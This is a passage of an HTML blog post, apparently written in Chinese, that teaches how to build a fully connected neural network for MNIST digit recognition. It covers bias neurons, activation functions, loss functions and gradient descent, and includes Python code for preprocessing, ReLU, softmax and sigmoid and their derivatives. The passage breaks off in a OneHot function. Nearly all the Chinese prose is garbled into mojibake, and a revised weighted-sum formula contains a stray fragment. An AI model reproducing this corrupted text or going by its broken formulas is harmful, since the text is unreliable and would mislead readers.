è¦æ˜¯çœ‹åˆ°å›¾é‡Œé¢ä»–æ²¡æœ‰å…¨è¿æ¥èµ·æ¥ï¼Œé‚£å¤šåŠæ˜¯æˆ‘æŠ å›¾çš„æ—¶å€™é­”æ£’ä¸å°å¿ƒæ‰£æ²¡äº†ï¼‰</p><p>è€Œç¥ç»å…ƒä¹‹é—´çš„ä¿¡å·ä¼ é€’å…¶å®æ˜¯ä¸€ä¸ªçº¿æ€§çš„è¿‡ç¨‹ï¼Œç±»æ¯”<code>y=kx+b</code>ï¼Œå³</p><center><code>Z[2][0]=âˆ‘w[2][i][0]*Z[1][i] for i in range(0,6)</code></center><br><center><b>WARNING: è¿™ä¸ªå¼å­æ˜¯é”™çš„ï¼Œä½†æš‚æ—¶å…ˆè¿™æ ·ç†è§£</b></center><br><p>åœ¨<code>w[2][i][0]</code>ä¸­ï¼Œ<code>w</code>è¡¨ç¤ºæƒé‡ï¼ˆç±»æ¯”kï¼Œå…·ä½“ç‚¹ï¼Œå¯ä»¥æŠŠwç›¸æˆæ˜¯ç¥ç»å…ƒä¹‹é—´è¿æ¥çš„çº¿ï¼‰ï¼Œ<code>[2]</code>è¡¨ç¤ºè¯¥æƒé‡æ˜¯ç¬¬ä¸€å±‚ä¸ç¬¬äºŒå±‚ä¹‹é—´çš„ï¼Œ<code>[i]</code>è¡¨ç¤ºä¸Šä¸€å±‚ä¸­çš„ç¬¬iä¸ªï¼Œ<code>[0]</code>è¡¨ç¤ºä¸‹ä¸€å±‚ä¸­çš„ç¬¬0ä¸ªï¼ˆè¡¨è¾¾ä¸Šæœ‰ç‚¹ç¹çï¼Œä½†å¹¶ä¸éš¾ç†è§£ï¼‰</p><h3 id="åç½®"><a href="#åç½®" class="headerlink" title="åç½®"></a>åç½®</h3><p>æ˜¾ç„¶ç›¸å¯¹äº<code>y=kx+b</code>ï¼Œè¿˜å°‘äº†å…¶ä¸­çš„<code>b</code>ï¼Œä¸ºäº†è¡¥ä¸Š<code>b</code>ï¼Œåœ¨FCNNä¸­ï¼Œä¼šç»™é™¤äº†è¾“å‡ºå±‚ä¹‹å¤–çš„æ¯ä¸€å±‚è¡¥ä¸Šä¸€ä¸ªç¥ç»å…ƒä½œä¸º<code>bias</code>ï¼Œåˆç§°åç½®ï¼Œè¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç¥ç»å…ƒï¼Œå…¶ä¸æ¥å—ä»»ä½•è¾“å…¥ï¼Œç„¶åå¯¹ä¸‹ä¸€å±‚ä¸­çš„æ¯ä¸€ä¸ªç¥ç»å…ƒéƒ½ç¨³å®šè¾“å‡ºä¸€ä¸ª<code>+1</code>ï¼Œç„¶åä¸‹ä¸€å±‚ä¸­åç½®å¯¹æ¯ä¸ªç¥ç»å…ƒå½±å“çš„å¤§å°å†ç”±å¯¹åº”çš„æƒé‡æ¥è°ƒæ•´ï¼Œå…·ä½“çš„è¿æ¥æ–¹å¼å¦‚å›¾ç™½è‰²éƒ¨åˆ†æ‰€ç¤º</p><img src="/images/FCNN_bias.png"/><p>ç°åœ¨å¯ä»¥è¯•ç€ä¸¾ä¸€ä¸ªä¾‹å­äº†ï¼Œæ¯”å¦‚è€ƒè™‘å¦‚ä¸‹æƒ…å†µ<code>?</code>çš„å€¼</p><img src="/images/FCNN_neuronExample.png"/><p>è€Œé—®å·çš„ä¸‹é¢é‚£ä¸ªç¥ç»å…ƒçš„å€¼ï¼Œæ˜¯<code>-0.3+0.05+(-0.12)+(-0.4)=-0.77</code></p><h3 id="æ¿€æ´»å‡½æ•°"><a href="#æ¿€æ´»å‡½æ•°" class="headerlink" title="æ¿€æ´»å‡½æ•°"></a>æ¿€æ´»å‡½æ•°</h3><p>å¦‚æœç›´æ¥æŠŠçº¿æ€§è®¡ç®—å¾—åˆ°çš„<code>Z</code>ä½œä¸ºè¯¥ç¥ç»å…ƒçš„è¾“å‡ºä¼ é€’åˆ°ä¸‹ä¸€å±‚ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ç½‘ç»œä¹Ÿå°†æ˜¯ä¸€ä¸ªçº¿æ€§ç½‘ç»œï¼Œè¿™æ ·çš„ç½‘ç»œä¸ç®¡æ˜¯åå±‚è¿˜æ˜¯ç™¾å±‚éƒ½åªèƒ½ç›¸å½“äºä¸€å±‚</p><p>ä¸ºäº†å¾—åˆ°ä¸€ä¸ªéçº¿æ€§çš„ç½‘ç»œï¼Œåœ¨é™¤äº†è¾“å…¥å±‚ä¹‹å¤–çš„æ¯ä¸€å±‚éƒ½ä¼šåœ¨<code>Z</code>çš„åŸºç¡€ä¸Šå†å¥—ä¸€ä¸ªæ¿€æ´»å‡½æ•°<code>A</code>ï¼Œæ¿€æ´»å‡½æ•°ä»¥<code>Z</code>ä½œä¸ºè¾“å…¥ï¼Œå³ç¥ç»å…ƒçš„è¾“å‡ºå…¶å®æ˜¯<code>A(Z)</code></p><p>å¸¸è§çš„æ¿€æ´»å‡½æ•°æœ‰ï¼š<code>ReLU</code>ï¼Œ<code>tanh</code>ï¼Œ<code>sigmoid</code>ç­‰ï¼Œå°±ä¸é™„å›¾äº†æœä¸€ä¸‹å°±æœ‰ï¼ˆæ‡’</p><p>é‚£ä¹ˆï¼Œæ›´æ–°ä¸€ä»¥ä¸‹ä¹‹å‰æåˆ°çš„<code>Z</code>çš„å¼å­ï¼Œåº”è¯¥æ˜¯</p><center><code>Z[2][0]=âˆ‘w[2][i][0]*A[2][i], i for i in range(0,6)</code></center><br><p>ï¼ˆç”±äºåç½®ä½œä¸ºä¸€ä¸ªç¥ç»å…ƒåŒ…å«è¿›ä¸Šä¸€å±‚çš„è¾“å‡ºï¼Œå°±ä¸åœ¨å¼å­ä¸­å•ç‹¬åŠ ä¸Šä¸€ä¸ª<code>b</code>äº†ï¼‰</p><p>å¯¹äºè¾“å‡ºå±‚ï¼Œæ¿€æ´»å‡½æ•°åˆ™è¦æ ¹æ®å…·ä½“é—®é¢˜æ¥é€‰æ‹©ï¼Œä¾‹å¦‚MNISTæ‰‹å†™æ•°å­—é›†æ˜¯åˆ†ç±»0è‡³9çš„æ•°å­—ï¼Œæœ‰å¤šä¸ªç±»åˆ«ï¼Œåˆ™ä¼šé€‰ç”¨<code>softMax</code>ä½œä¸ºè¾“å‡ºçš„æ¿€æ´»å‡½æ•°ï¼Œå…¶ç‰¹å¾æ˜¯ç´¯åŠ ä¹‹å’Œä¸º1ï¼Œè¿™ç¬¦åˆå¤šåˆ†ç±»çš„é—®é¢˜çš„æœŸæœ›è§£ï¼Œæ›´å…·ä½“çš„ä¸œè¥¿ï¼Œæ¯”å¦‚<code>softMax</code>çš„æ±‚åå¯¼ï¼Œå…·ä½“å…¬å¼ä¹‹ç±»çš„ï¼Œå°±ä¸èµ˜è¿°äº†ï¼ˆæ‡’</p><h3 id="æµç¨‹æ¢³ç†"><a href="#æµç¨‹æ¢³ç†" class="headerlink" title="æµç¨‹æ¢³ç†"></a>æµç¨‹æ¢³ç†</h3><p>ä»¥ä¸‹æ¢³ç†ä¸€ä¸‹æ•°æ®ä¼ é€’çš„æ•´ä½“æµç¨‹</p><ul><li>è¾“å…¥çš„æ•°æ®ä¸º<code>X</code>ï¼ˆè¾“å…¥å±‚ï¼‰ï¼Œç›´æ¥è¾“å…¥åˆ°éšè—å±‚</li><li>éšè—å±‚ç¬¬ä¸€å±‚çš„è¾“å‡ºä¸º<code>A1(Z1)</code>ï¼Œå…¶ä¸­<code>Z1=w1*X</code></li><li>éšè—å±‚ç¬¬äºŒå±‚çš„è¾“å‡ºä¸º<code>A2(Z2)</code>ï¼Œå…¶ä¸­<code>Z2=w2*A1</code></li><li>â€¦â€¦ä»¥æ­¤ç±»æ¨</li></ul><h2 id="è®­ç»ƒè¿‡ç¨‹"><a href="#è®­ç»ƒè¿‡ç¨‹" class="headerlink" title="è®­ç»ƒè¿‡ç¨‹"></a>è®­ç»ƒè¿‡ç¨‹</h2><p>ä¸»è¦å°±æ˜¯æ¢¯åº¦ä¸‹é™ï¼Œä¸€å¥è¯ï¼Œæ±‚æ¢¯åº¦ï¼Œç„¶åå¾€è´Ÿæ¢¯åº¦çš„æ–¹å‘è¡Œè¿›ï¼Œå¯ä»¥æ±‚å¾—ä¸€ä¸ªå‡½æ•°çš„æå°å€¼ï¼Œä½†æ˜¯ï¼šä¸ºä»€ä¹ˆæ¢¯åº¦ä¸‹é™è¿™ä¸ªæ–¹æ³•å¯ä»¥è®­ç»ƒä¸€ä¸ªæ¨¡å‹ï¼Œå…·ä½“æ˜¯æ€ä¹ˆimplementçš„ï¼Œå¤§æ¦‚å°±åˆ°äº†å¤§å¤šæ•°äººçš„è®¤çŸ¥è¾¹ç•Œäº†/æ»‘ç¨½ã€‚è€ƒè™‘æ¢¯åº¦ä¸‹é™ä¹‹å‰ï¼Œå…ˆäº†è§£æ±‚æ¢¯åº¦çš„åº”ç”¨å¯¹è±¡ï¼šæŸå¤±å‡½æ•°</p><h3 id="æŸå¤±å‡½æ•°"><a href="#æŸå¤±å‡½æ•°" class="headerlink" title="æŸå¤±å‡½æ•°"></a>æŸå¤±å‡½æ•°</h3><p>loss/cost functionï¼Œè®°ä½œ<code>J</code>ï¼Œæ˜¯æè¿°æ¨¡å‹çš„é¢„æµ‹ç»“æœå¯¹äºçœŸå®å€¼çš„å·®å¼‚çš„å‡½æ•°ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œç»™äº†æ¨¡å‹<code>1</code>çš„å›¾ç‰‡è¾“å…¥ï¼Œæ¨¡å‹çš„è¾“å‡ºå´æ˜¯<code>&#123;0.5,0.5,0,0,0,0,0,0,0,0&#125;</code>ï¼Œè¿™ä¸åº”è¯¥å‡ºç°çš„ç»“æœäº§ç”Ÿäº†åå·®ï¼Œè¦æè¿°è¿™ä¸ªåå·®ï¼Œå¯ä»¥ç›´æ¥æ±‚å®é™…è¾“å‡ºå‘é‡å’ŒæœŸæœ›çš„è¾“å‡ºå‘é‡ä¹‹å·®çš„L2èŒƒæ•°ï¼Œå³æ±‚ä»–ä»¬çš„å‡æ–¹è¯¯å·®ï¼Œè®°æœŸæœ›çš„å‘é‡ä¸º<code>y</code>ï¼Œå®é™…è¾“å‡ºçš„å‘é‡ä¸º<code>h(x)</code>ï¼Œåˆ™<code>J=âˆ‘((y-h(x))*(y-h(x)))</code>ï¼Œæ­¤å¤„ä¹˜ç§¯ä¸ºå¯¹åº”å…ƒç´ ç›¸ä¹˜ï¼Œåˆ™è®¡ç®—å¯å¾—losså¤§çº¦æ˜¯0.71</p><p>é€šè¿‡æŸå¤±å‡½æ•°ï¼Œå°±å¯ä»¥é‡åŒ–è¡¨ç¤ºæ¨¡å‹é¢„æµ‹ç»“æœçš„å‡†ç¡®åº¦äº†ï¼Œè€Œå¤§å¤šæ•°æ—¶å€™ä¼šä½¿ç”¨è¾ƒå¤æ‚åº¦æ›´é«˜çš„å¸¦<code>log</code>çš„äº¤å‰ç†µå‡½æ•°ä½œä¸ºæŸå¤±å‡½æ•°ï¼Œå…¬å¼å¦‚ä¸‹</p><img src="/images/FCNN_crossEntropy.png"/><p>çœ‹èµ·æ¥æ¯”è¾ƒå¤æ‚ï¼Œä½†ç”»ä¸€ä¸ªæŠ›ç‰©çº¿æ¥è¡¨ç¤ºå‡æ–¹è¯¯å·®å‡½æ•°ï¼Œå†ç”»ä¸€ä¸‹logçš„å›¾åƒç†è§£äº¤å‰ç†µå‡½æ•°å°±å·®ä¸å¤šäº†</p><p>äº¤å‰ç†µå¥½å¤„éƒ½æœ‰å•¥ï¼šæ”¶æ•›å¿«ï¼Œå±€éƒ¨æœ€ä¼˜ç‚¹å°‘ï¼ŒçŸ¥é“å°±è¡Œ</p><h3 id="æ¢¯åº¦ä¸‹é™"><a href="#æ¢¯åº¦ä¸‹é™" class="headerlink" title="æ¢¯åº¦ä¸‹é™"></a>æ¢¯åº¦ä¸‹é™</h3><blockquote><p>é™¤äº†å•çº¯çš„æ¢¯åº¦ä¸‹é™ï¼Œè¿˜æœ‰å¦‚momentumï¼ŒRmsPropï¼ŒAdamç­‰ä¼˜åŒ–ç®—æ³•ï¼Œä½†æœ¬æ–‡ä½¿ç”¨<code>mini-batch</code>æ¢¯åº¦ä¸‹é™æ³•æ¥è®­ç»ƒ</p></blockquote><p>é¦–å…ˆæ˜ç¡®å¸¸é‡ï¼šè®­ç»ƒæ—¶ç”¨çš„æ ·æœ¬<code>X</code>æ˜¯å›ºå®šä¸å˜çš„ï¼Œæ ·æœ¬å¯¹åº”çš„<code>lable</code>ï¼Œæˆ–è®°ä½œ<code>y</code>ï¼Œä¹Ÿæ˜¯ä¸å˜çš„ï¼Œå”¯ä¸€å˜åŒ–çš„å°±åªæœ‰ç½‘ç»œä¸­é—´è¿æ¥å„ä¸ªå±‚çº§çš„æƒé‡<code>w</code>ï¼ˆåç½®<code>b</code>åŒ…å«åœ¨æƒé‡é‡Œè¾¹ï¼Œå› ä¸ºåç½®çš„å…·ä½“å¤§å°ç”±è¿æ¥çš„æƒé‡æ§åˆ¶ï¼‰ï¼Œä»¥åŠå› ä¸ºæƒé‡å˜åŒ–è€Œè·Ÿç€ä¸€èµ·å˜åŒ–çš„é¢„æµ‹ç»“æœï¼Œè¿˜æœ‰ä¸­é—´é‡<code>A</code>å’Œ<code>Z</code>ï¼Œä¸€åˆ‡å˜åŒ–éƒ½æ¥è‡ªäºæƒé‡<code>w</code>çš„å˜åŒ–</p><p>é—®é¢˜ç°åœ¨åˆ™åº”è¯¥ç†è§£æˆï¼šæ‰¾åˆ°åˆé€‚çš„<code>w</code>ï¼Œä½¿å¾—<code>J</code>æœ€å°</p><p>å…·ä½“ç‚¹ï¼Œå°±æ˜¯ï¼šå¯¹<code>J(w)</code>æ±‚å…³äº<code>w</code>çš„åå¯¼ï¼Œè·å–<code>J(w)</code>çš„æ¢¯åº¦ï¼Œç„¶åæ›´æ–°æƒé‡<code>w</code>ä¸º<code>w-=rate*dw</code>ï¼Œå…¶ä¸­ï¼Œ<code>dw</code>ä¸º<code>J(w)</code>çš„æ¢¯åº¦ï¼Œ<code>rate</code>ä¸ºå­¦ä¹ ç‡ï¼Œæ§åˆ¶äº†ä¸€æ¬¡ä¸‹é™å¤šå°‘ï¼Œå­¦ä¹ ç‡è¿‡ä½ä¼šå¯¼è‡´è®­ç»ƒç¼“æ…¢ï¼Œå­¦ä¹ ç‡è¿‡é«˜åˆ™å®¹æ˜“å„ç§<code>NAN</code>æˆ–è€…åå¤æ¨ªè·³æ— æ³•æ”¶æ•›ï¼Œéœ€è¦ä¸€å®šçš„è¯•é”™æˆæœ¬æ¥ç¡®å®šåˆé€‚çš„å­¦ä¹ ç‡ï¼Œä¸€èˆ¬åœ¨10e-6åˆ°1ä¹‹é—´</p><p>ç”±äºè¿™éƒ¨åˆ†å†…å®¹ç½‘ä¸Šèµ„æºæŒºå¤šçš„ï¼Œå°±ä¸èµ˜è¿°äº†ï¼ˆæ‡’</p><p>ï¼ˆåé¢ä¼šæœ‰åå‘ä¼ æ’­çš„æ¨å¯¼ï¼Œè¿™æ‰æ˜¯é‡ç‚¹</p><h2 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h2><p>ä»¥ä¸Šå°±æ˜¯ä¸€äº›é‡è¦çš„å‰ç½®ï¼ˆå› ä¸ºæˆ‘æ€•æŠŠç†è§£å’Œä»£ç èä¸ºä¸€ä½“ä¼šå¯¼è‡´é€»è¾‘æ··ä¹±ï¼‰ï¼Œä»¥ä¸‹å†…å®¹å°±æ­£å¼å¼€å§‹æ¶‰åŠç ä»£ç äº†ï¼Œåå¥½æ‰¶ç¨³</p><h3 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>åœ¨<code>kaggle</code>ä¸‹è½½åˆ°ä»–ä»¬æä¾›çš„MNISTæ‰‹å†™æ•°å­—æ•°æ®é›†åï¼Œä¸èƒ½ä¸Šæ‰‹å³ç”¨</p><ul><li>é¢œè‰²èŒƒå›´0è‡³255è¿™ä¸ªåŒºé—´å¤ªå¤§äº†ï¼Œåº”è¯¥å‹ç¼©åˆ°0è‡³1ï¼Œæ•´ä½“é™¤ä»¥255</li><li>å†è€…æ•°æ®çš„åˆ†å¸ƒä¹Ÿä¸è‡ªç„¶ï¼Œåº”è¯¥å¥—ä¸€ä¸ªæ ‡å‡†åˆ†æ•°å…¬å¼ï¼Œå¤„ç†æˆæ­£æ€åˆ†å¸ƒ</li></ul><p>å…³äºåº”è¯¥å¯¹å•ä¸ªåƒç´ åšå¤„ç†è¿˜æ˜¯å¯¹æ•´ä½“åšå¤„ç†ï¼ˆä¾‹å¦‚æ±‚å‡å€¼ï¼Œæ˜¯å¯¹æ¯ä¸€ä¸ªåƒç´ æ±‚å‡ºå¯¹åº”åƒç´ ä½ç½®çš„å‡å€¼ï¼Œè¿˜æ˜¯æ•´ä½“å¤„ç†ï¼Œç›´æ¥æ±‚å‡ºæ‰€æœ‰åƒç´ çš„å‡å€¼ï¼‰ï¼Œåœ¨æœ¬ä¾‹ä¸­åº”è¯¥æ•´ä½“å¤„ç†æ›´å¥½</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤„ç†æ•°æ®é›†</span></span><br><span class="line">dsTrain = pd.read_csv(<span class="string">r&#x27;mnist.csv&#x27;</span>)</span><br><span class="line"><span class="comment"># åŸæœ¬kaggleä¸Šçš„æµ‹è¯•é›†æ˜¯æ²¡æœ‰lableåˆ†ç±»çš„ï¼Œåœ¨kaggleçš„leaderBoardä¸Šæ‰¾åˆ°æ­£ç¡®çš„lableåpd.concatåˆ°åŸæœ¬çš„æµ‹è¯•é›†</span></span><br><span class="line">dsTest = pd.read_csv(<span class="string">r&#x27;mnist_test.csv&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># è·å–è®­ç»ƒé›†çš„ç‰¹å¾</span></span><br><span class="line"><span class="string">ds_std = np.std(dsTrain.iloc[:, 1:], axis = 0) # è®­ç»ƒé›†æ ‡å‡†å·®</span></span><br><span class="line"><span class="string">ds_mean = np.mean(dsTrain.iloc[:, 1:], axis = 0) # è®­ç»ƒé›†å‡å€¼</span></span><br><span class="line"><span class="string"># æ ‡å‡†åŒ–æ•°æ®ï¼Œæ­¤æ–¹æ³•æ˜¯é’ˆå¯¹è®­ç»ƒé›†ä¸­çš„åŒä¸€ä½ç½®çš„åƒç´ ï¼Œæ•ˆæœä¸€èˆ¬ï¼Œæ•…æœªé‡‡ç”¨</span></span><br><span class="line"><span class="string">for i in range(len(ds.T) - 1):</span></span><br><span class="line"><span class="string">    if ds_std[i] != 0: # è¾¹è§’ä¸Šå°±å¾ˆå¯èƒ½å‡ºç°æ ‡å‡†å·®ä¸º0çš„åƒç´ </span></span><br><span class="line"><span class="string">        dsR.iloc[:, i + 1] = (dsR.iloc[:, i + 1] - ds_mean[i]) / ds_std[i] # æ ‡å‡†åˆ†æ•°å…¬å¼ï¼ŒåŸºæœ¬å‘ˆæ­£æ€åˆ†å¸ƒ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">trainX = dsTrain.iloc[:, <span class="number">1</span>:]</span><br><span class="line">trainy = dsTrain.iloc[:, :<span class="number">1</span>]</span><br><span class="line"><span class="comment"># æ’åˆ—æµ‹è¯•é›†ï¼Œæ–¹ä¾¿åœ¨æµ‹è¯•ä¹‹åç»˜å›¾</span></span><br><span class="line">testX = pd.concat([dsTest[dsTest[<span class="string">&quot;label&quot;</span>] == i].iloc[:, <span class="number">1</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line">testy = pd.concat([dsTest[dsTest[<span class="string">&quot;label&quot;</span>] == i].iloc[:, :<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line"><span class="comment"># å½’ä¸€åŒ–</span></span><br><span class="line">trainX = trainX / <span class="number">255</span></span><br><span class="line">testX = testX / <span class="number">255</span></span><br><span class="line"><span class="comment"># è·å–è®­ç»ƒé›†ç‰¹å¾</span></span><br><span class="line">mean = np.mean(np.array(trainX).ravel())  <span class="comment"># è®­ç»ƒé›†å‡å€¼</span></span><br><span class="line">std = np.std(np.array(trainX).ravel())  <span class="comment"># è®­ç»ƒé›†æ ‡å‡†å·®</span></span><br><span class="line">trainX = (trainX - mean) / std  <span class="comment"># æ ‡å‡†åˆ†æ•°å…¬å¼ï¼ŒåŸºæœ¬å‘ˆæ­£æ€åˆ†å¸ƒ</span></span><br><span class="line">testX = (testX - mean) / std  <span class="comment"># ç”¨è®­ç»ƒé›†çš„ç‰¹å¾å¤„ç†æµ‹è¯•é›†æ•°æ®ï¼Œæ‰èƒ½è¯æ˜æ¨¡å‹æ˜¯å¦èƒ½è¯†åˆ«é™Œç”Ÿæ•°æ®</span></span><br></pre></td></tr></table></figure>    </div></div><h3 id="æ•°å­¦å‡½æ•°"><a href="#æ•°å­¦å‡½æ•°" class="headerlink" title="æ•°å­¦å‡½æ•°"></a>æ•°å­¦å‡½æ•°</h3><p>ä¹‹å‰æåˆ°äº†ä¸€å †æ•°å­¦å‡½æ•°ï¼Œå®ç°èµ·æ¥ä¸»è¦å°±æ˜¯<code>softMax</code>å’Œ<code>sigmoid</code>ä¼šæ¯”è¾ƒè€½è¯¯æ—¶é—´</p><p><code>leaky ReLU</code>æ˜¯<code>ReLU</code>çš„å®éªŒæ€§å˜ç§ï¼Œé€šå¸¸ç”¨äºåœ¨å®éªŒçš„æ—¶å€™é¿å…å› ä¸ºä½¿ç”¨<code>ReLU</code>å¯¼è‡´å¤§é‡ç¥ç»å…ƒæ­»äº¡ï¼Œæ¢¯åº¦æ¶ˆå¤±çš„é—®é¢˜</p><blockquote><p>åè®°ï¼šä¹‹å‰çš„SoftMaxåå¯¼æ±‚é”™äº†ï¼Œå…¶åº”è¯¥æ˜¯ä¸€ä¸ªæ–¹é˜µï¼Œä½†ä¼°è®¡æ˜¯å› ä¸ºä¸€å¼€å§‹å†™çš„æ—¶å€™ä¸ºäº†æ–¹ä¾¿ï¼Œæ²¡æœ‰ç†è§£æ¸…æ¥šå°±å»æ‰¾äº†ä¸€æ®µæ ‡ç§°æ˜¯derivative of softmaxçš„ä»£ç ï¼Œç»“æœä»–æ±‚çš„åªæ˜¯åœ¨<code>i=j</code>æƒ…å†µä¸‹çš„çš„softmax<br>è™½ç„¶äº‹åè¯æ˜è¿™ä¸€è°¬è¯¯åªå½±å“äº†æˆ‘ä¸€ä¸ªç™¾åˆ†ç‚¹çš„æ­£ç¡®ç‡ï¼Œä½†ç»™æˆ‘åæ¥å¤ç”¨è¿™æ®µä»£ç æ¥æ‰¾å¯¹äºè¾“å…¥å‘é‡çš„æ¢¯åº¦ï¼Œå¹¶ç”¨è‡ªå·±æ‰¾åˆ°çš„æ¢¯åº¦å’Œ<code>tensorflow</code>ä¸­<code>gradientTape</code>æ±‚å¾—çš„æ¢¯åº¦æ¯”è¾ƒæ—¶æ€€ç–‘äººç”Ÿ</p></blockquote><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># d_func æ˜¯funcçš„å¯¼æ•°/åå¯¼ derivative</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">relu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_relu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lrelu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># leaky relu</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0.1</span> * x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_lrelu</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (x &gt; <span class="number">0</span>) * <span class="number">0.9</span> + <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">softMax</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.array(np.exp(x) / np.<span class="built_in">sum</span>(np.exp(x), axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_softMax</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = softMax(x)</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">1</span>]):</span><br><span class="line">            r.append([])</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">1</span>]):</span><br><span class="line">                r[-<span class="number">1</span>].append(-x[i][j] * x[i][k] <span class="keyword">if</span> j != k <span class="keyword">else</span> x[i][j] * (<span class="number">1</span> - x[i][k]))</span><br><span class="line">    <span class="keyword">return</span> np.array(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">x</span>):</span></span><br><span class="line">    x_ravel = np.array(x).ravel()</span><br><span class="line">    length = <span class="built_in">len</span>(x_ravel)</span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> x_ravel[i] &gt;= <span class="number">0</span>:</span><br><span class="line">            x_ravel[i] = <span class="built_in">min</span>(<span class="number">19</span>, x_ravel[i])  <span class="comment"># é™åˆ¶èŒƒå›´ï¼Œç²¾åº¦ä¸å¤Ÿï¼Œnp.exp()ä¹Ÿæ˜“çˆ†</span></span><br><span class="line">            y.append(<span class="number">1.0</span> / (<span class="number">1</span> + np.exp(-x_ravel[i])))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x_ravel[i] = <span class="built_in">max</span>(-<span class="number">744</span>, x_ravel[i])</span><br><span class="line">            y.append(np.exp(x_ravel[i]) / (np.exp(x_ravel[i]) + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> np.array(y).reshape(x.shape)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_sigmoid</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sigmoid(x) * (<span class="number">1</span> - sigmoid(x))</span><br></pre></td></tr></table></figure>    </div></div><h3 id="æ•°æ®å¤„ç†å‡½æ•°"><a href="#æ•°æ®å¤„ç†å‡½æ•°" class="headerlink" title="æ•°æ®å¤„ç†å‡½æ•°"></a>æ•°æ®å¤„ç†å‡½æ•°</h3><p>ä¹‹å‰æåˆ°çš„<code>OneHot</code>å’Œæ’å…¥<code>bias</code></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OneHot</span>(<span class="params">length, width, y</span>):</span></span><br><span class="line">    <span class="comment"># OneHot encoding</span></span><br><span class="line">    y = 